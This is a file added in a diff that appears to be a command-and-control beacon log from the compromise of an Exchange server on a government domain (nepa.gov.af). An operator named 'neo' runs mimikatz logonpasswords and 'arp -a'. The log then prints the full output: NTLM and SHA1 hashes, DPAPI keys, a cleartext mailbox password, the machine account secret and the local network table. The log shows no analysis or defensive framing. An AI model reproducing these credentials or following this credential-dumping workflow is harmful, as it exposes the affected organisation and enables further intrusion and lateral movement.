@@ -1,0 +1,231 @@
+12/01 18:47:38 UTC [metadata] 149.54.9.2 <- 192.168.10.254; computer: EXCHANGE; user: SYSTEM *; process: dns.exe; pid: 141128; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+12/01 18:48:40 UTC [input] <neo> logonpasswords
+12/01 18:48:40 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+12/01 18:49:33 UTC [input] <neo> shell arp -a
+12/01 18:49:33 UTC [task] <T1059> Tasked beacon to run: arp -a
+12/01 18:49:34 UTC [checkin] host called home, sent: 313712 bytes
+12/01 18:49:38 UTC [output]
+received output:
+
+Authentication Id : 0 ; 56434 (00000000:0000dc72)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:13:58 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * NTLM     : 9b3bbd1bf8883b0f34a09187ce640105
+	 * SHA1     : 6b1d4afd58b9f634dd411ea4ec38150003f62308
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	 [00000000]
+	 * Username : HealthMailbox1bb4cf61f5904b4d979646704ddcf621@nepa.gov.af
+	 * Domain   : (null)
+	 * Password : cw}(57*DWhRs}hx}/0$)zz3Y85eQAclK(eG7nK-}:nkEGoaU{$q}d0yneh/_2U(##(%#UzEBC^9|Mg@vedT/Eg]W[jF&?z&fLhR5%BUfTd9Zn(*pc%nS@$?vSMTligwB
+	credman :	
+
+Authentication Id : 0 ; 151679431 (00000000:090a71c7)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox1bb4cf6
+Domain            : NEPA0
+Logon Server      : EXCHANGE
+Logon Time        : 12/1/2023 4:15:45 PM
+SID               : S-1-5-21-3648652324-2173792509-3395300360-1134
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox1bb4cf6
+	 * Domain   : NEPA0
+	 * NTLM     : f81bf1f418a633a9e955e128b1b8bcd3
+	 * SHA1     : cf51e907a5dd721fa211f89ddaf6d0926a5036b2
+	 * DPAPI    : 1c181731ba3ad75ccb0e424b9c73fc1d
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox1bb4cf6
+	 * Domain   : NEPA0
+	 * Password : cw}(57*DWhRs}hx}/0$)zz3Y85eQAclK(eG7nK-}:nkEGoaU{$q}d0yneh/_2U(##(%#UzEBC^9|Mg@vedT/Eg]W[jF&?z&fLhR5%BUfTd9Zn(*pc%nS@$?vSMTligwB
+	kerberos :	
+	 * Username : HealthMailbox1bb4cf6
+	 * Domain   : NEPA.GOV.AF
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:14:05 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 79757 (00000000:0001378d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:14:05 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * NTLM     : 9b3bbd1bf8883b0f34a09187ce640105
+	 * SHA1     : 6b1d4afd58b9f634dd411ea4ec38150003f62308
+	tspkg :	
+	wdigest :	
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * Password : 72 ce a7 bc cf 9b de 7e f0 86 2b 00 b1 08 10 cf 4b 89 ba 80 c1 c1 04 72 ba 01 8f 80 81 ea 16 aa c9 34 75 c0 ec af 5a 5a 51 50 75 fd 93 0b 3a 98 f6 90 68 13 59 be 10 71 a1 12 77 dd 14 f9 aa f4 5c 1c 6d 1a 20 9d 16 d0 37 e9 62 72 e0 85 27 25 dc ea 14 5d b8 7d cf 90 71 2b dc 2d 8f 80 d4 83 ed 72 5b 04 51 24 3a 36 05 91 f5 df af ed 19 ac 13 99 37 57 b2 88 b8 50 87 2c cc ed 1f c3 47 4b 65 f0 e8 63 50 c3 7f a8 ae 79 42 5e 94 27 5d fa 2a f8 fb c2 79 98 28 d0 0c bd c8 41 4f 2f 6c d9 b7 c1 b2 cc ef d1 70 56 cb c4 56 42 ac 9f 73 ed 6b a9 97 8c d2 b4 c0 61 a0 c1 59 e8 e2 60 9e 9c 3c cd b1 5c 0b 66 a4 76 9a c1 b9 ed d8 86 8b 26 76 21 b2 19 4a e4 61 f7 c6 de 78 ef 05 55 ae 12 0b e6 ba bc d5 b5 8d 3f ca c3 f2 b9 11 88 91 09 
+	kerberos :	
+	 * Username : EXCHANGE$
+	 * Domain   : nepa.gov.af
+	 * Password : 72 ce a7 bc cf 9b de 7e f0 86 2b 00 b1 08 10 cf 4b 89 ba 80 c1 c1 04 72 ba 01 8f 80 81 ea 16 aa c9 34 75 c0 ec af 5a 5a 51 50 75 fd 93 0b 3a 98 f6 90 68 13 59 be 10 71 a1 12 77 dd 14 f9 aa f4 5c 1c 6d 1a 20 9d 16 d0 37 e9 62 72 e0 85 27 25 dc ea 14 5d b8 7d cf 90 71 2b dc 2d 8f 80 d4 83 ed 72 5b 04 51 24 3a 36 05 91 f5 df af ed 19 ac 13 99 37 57 b2 88 b8 50 87 2c cc ed 1f c3 47 4b 65 f0 e8 63 50 c3 7f a8 ae 79 42 5e 94 27 5d fa 2a f8 fb c2 79 98 28 d0 0c bd c8 41 4f 2f 6c d9 b7 c1 b2 cc ef d1 70 56 cb c4 56 42 ac 9f 73 ed 6b a9 97 8c d2 b4 c0 61 a0 c1 59 e8 e2 60 9e 9c 3c cd b1 5c 0b 66 a4 76 9a c1 b9 ed d8 86 8b 26 76 21 b2 19 4a e4 61 f7 c6 de 78 ef 05 55 ae 12 0b e6 ba bc d5 b5 8d 3f ca c3 f2 b9 11 88 91 09 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : EXCHANGE$
+Domain            : NEPA0
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:13:57 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * Password : 72 ce a7 bc cf 9b de 7e f0 86 2b 00 b1 08 10 cf 4b 89 ba 80 c1 c1 04 72 ba 01 8f 80 81 ea 16 aa c9 34 75 c0 ec af 5a 5a 51 50 75 fd 93 0b 3a 98 f6 90 68 13 59 be 10 71 a1 12 77 dd 14 f9 aa f4 5c 1c 6d 1a 20 9d 16 d0 37 e9 62 72 e0 85 27 25 dc ea 14 5d b8 7d cf 90 71 2b dc 2d 8f 80 d4 83 ed 72 5b 04 51 24 3a 36 05 91 f5 df af ed 19 ac 13 99 37 57 b2 88 b8 50 87 2c cc ed 1f c3 47 4b 65 f0 e8 63 50 c3 7f a8 ae 79 42 5e 94 27 5d fa 2a f8 fb c2 79 98 28 d0 0c bd c8 41 4f 2f 6c d9 b7 c1 b2 cc ef d1 70 56 cb c4 56 42 ac 9f 73 ed 6b a9 97 8c d2 b4 c0 61 a0 c1 59 e8 e2 60 9e 9c 3c cd b1 5c 0b 66 a4 76 9a c1 b9 ed d8 86 8b 26 76 21 b2 19 4a e4 61 f7 c6 de 78 ef 05 55 ae 12 0b e6 ba bc d5 b5 8d 3f ca c3 f2 b9 11 88 91 09 
+	kerberos :	
+	 * Username : exchange$
+	 * Domain   : NEPA.GOV.AF
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : EXCHANGE$
+Domain            : NEPA0
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:14:03 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * NTLM     : 9b3bbd1bf8883b0f34a09187ce640105
+	 * SHA1     : 6b1d4afd58b9f634dd411ea4ec38150003f62308
+	tspkg :	
+	wdigest :	
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * Password : 72 ce a7 bc cf 9b de 7e f0 86 2b 00 b1 08 10 cf 4b 89 ba 80 c1 c1 04 72 ba 01 8f 80 81 ea 16 aa c9 34 75 c0 ec af 5a 5a 51 50 75 fd 93 0b 3a 98 f6 90 68 13 59 be 10 71 a1 12 77 dd 14 f9 aa f4 5c 1c 6d 1a 20 9d 16 d0 37 e9 62 72 e0 85 27 25 dc ea 14 5d b8 7d cf 90 71 2b dc 2d 8f 80 d4 83 ed 72 5b 04 51 24 3a 36 05 91 f5 df af ed 19 ac 13 99 37 57 b2 88 b8 50 87 2c cc ed 1f c3 47 4b 65 f0 e8 63 50 c3 7f a8 ae 79 42 5e 94 27 5d fa 2a f8 fb c2 79 98 28 d0 0c bd c8 41 4f 2f 6c d9 b7 c1 b2 cc ef d1 70 56 cb c4 56 42 ac 9f 73 ed 6b a9 97 8c d2 b4 c0 61 a0 c1 59 e8 e2 60 9e 9c 3c cd b1 5c 0b 66 a4 76 9a c1 b9 ed d8 86 8b 26 76 21 b2 19 4a e4 61 f7 c6 de 78 ef 05 55 ae 12 0b e6 ba bc d5 b5 8d 3f ca c3 f2 b9 11 88 91 09 
+	kerberos :	
+	 * Username : exchange$
+	 * Domain   : NEPA.GOV.AF
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 79776 (00000000:000137a0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:14:05 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * NTLM     : 9b3bbd1bf8883b0f34a09187ce640105
+	 * SHA1     : 6b1d4afd58b9f634dd411ea4ec38150003f62308
+	tspkg :	
+	wdigest :	
+	 * Username : EXCHANGE$
+	 * Domain   : NEPA0
+	 * Password : 72 ce a7 bc cf 9b de 7e f0 86 2b 00 b1 08 10 cf 4b 89 ba 80 c1 c1 04 72 ba 01 8f 80 81 ea 16 aa c9 34 75 c0 ec af 5a 5a 51 50 75 fd 93 0b 3a 98 f6 90 68 13 59 be 10 71 a1 12 77 dd 14 f9 aa f4 5c 1c 6d 1a 20 9d 16 d0 37 e9 62 72 e0 85 27 25 dc ea 14 5d b8 7d cf 90 71 2b dc 2d 8f 80 d4 83 ed 72 5b 04 51 24 3a 36 05 91 f5 df af ed 19 ac 13 99 37 57 b2 88 b8 50 87 2c cc ed 1f c3 47 4b 65 f0 e8 63 50 c3 7f a8 ae 79 42 5e 94 27 5d fa 2a f8 fb c2 79 98 28 d0 0c bd c8 41 4f 2f 6c d9 b7 c1 b2 cc ef d1 70 56 cb c4 56 42 ac 9f 73 ed 6b a9 97 8c d2 b4 c0 61 a0 c1 59 e8 e2 60 9e 9c 3c cd b1 5c 0b 66 a4 76 9a c1 b9 ed d8 86 8b 26 76 21 b2 19 4a e4 61 f7 c6 de 78 ef 05 55 ae 12 0b e6 ba bc d5 b5 8d 3f ca c3 f2 b9 11 88 91 09 
+	kerberos :	
+	 * Username : EXCHANGE$
+	 * Domain   : nepa.gov.af
+	 * Password : 72 ce a7 bc cf 9b de 7e f0 86 2b 00 b1 08 10 cf 4b 89 ba 80 c1 c1 04 72 ba 01 8f 80 81 ea 16 aa c9 34 75 c0 ec af 5a 5a 51 50 75 fd 93 0b 3a 98 f6 90 68 13 59 be 10 71 a1 12 77 dd 14 f9 aa f4 5c 1c 6d 1a 20 9d 16 d0 37 e9 62 72 e0 85 27 25 dc ea 14 5d b8 7d cf 90 71 2b dc 2d 8f 80 d4 83 ed 72 5b 04 51 24 3a 36 05 91 f5 df af ed 19 ac 13 99 37 57 b2 88 b8 50 87 2c cc ed 1f c3 47 4b 65 f0 e8 63 50 c3 7f a8 ae 79 42 5e 94 27 5d fa 2a f8 fb c2 79 98 28 d0 0c bd c8 41 4f 2f 6c d9 b7 c1 b2 cc ef d1 70 56 cb c4 56 42 ac 9f 73 ed 6b a9 97 8c d2 b4 c0 61 a0 c1 59 e8 e2 60 9e 9c 3c cd b1 5c 0b 66 a4 76 9a c1 b9 ed d8 86 8b 26 76 21 b2 19 4a e4 61 f7 c6 de 78 ef 05 55 ae 12 0b e6 ba bc d5 b5 8d 3f ca c3 f2 b9 11 88 91 09 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 3310152 (00000000:00328248)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox1bb4cf6
+Domain            : NEPA0
+Logon Server      : EXCHANGE
+Logon Time        : 11/30/2023 8:19:08 AM
+SID               : S-1-5-21-3648652324-2173792509-3395300360-1134
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox1bb4cf6
+	 * Domain   : NEPA0
+	 * NTLM     : f81bf1f418a633a9e955e128b1b8bcd3
+	 * SHA1     : cf51e907a5dd721fa211f89ddaf6d0926a5036b2
+	 * DPAPI    : 1c181731ba3ad75ccb0e424b9c73fc1d
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox1bb4cf6
+	 * Domain   : NEPA0
+	 * Password : cw}(57*DWhRs}hx}/0$)zz3Y85eQAclK(eG7nK-}:nkEGoaU{$q}d0yneh/_2U(##(%#UzEBC^9|Mg@vedT/Eg]W[jF&?z&fLhR5%BUfTd9Zn(*pc%nS@$?vSMTligwB
+	kerberos :	
+	 * Username : HealthMailbox1bb4cf6
+	 * Domain   : NEPA.GOV.AF
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/30/2023 8:14:43 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+
+12/01 18:49:38 UTC [output]
+received output:
+
+Interface: 192.168.10.254 --- 0x14
+  Internet Address      Physical Address      Type
+  192.168.10.1          b8-69-f4-c5-a1-d2     dynamic   
+  192.168.10.255        ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  224.0.0.253           01-00-5e-00-00-fd     static    
+  239.255.102.18        01-00-5e-7f-66-12     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+
+
